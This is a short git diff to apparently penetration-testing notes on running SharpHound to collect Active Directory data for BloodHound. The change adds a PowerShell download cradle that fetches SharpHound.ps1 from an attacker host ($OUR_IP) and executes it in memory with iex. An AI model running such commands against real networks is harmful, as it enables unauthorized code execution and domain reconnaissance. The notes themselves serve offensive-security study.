@@ -17,13 +17,14 @@ We first need to collect data from our target with [SharpHound](https://github.c
 
 ```bash
 # Grab local collectors in kali
+
 cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
 cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe .
 ```
 
 ```bash
 # Import Sharphound.ps1
-Import-Module .\SharpHound.ps1
+iex(new-object net.webclient).downloadstring("http://$OUR_IP/SharpHound.ps1")
 Get-Help Invoke-BloodHound
 
 # Execute Bloodhound
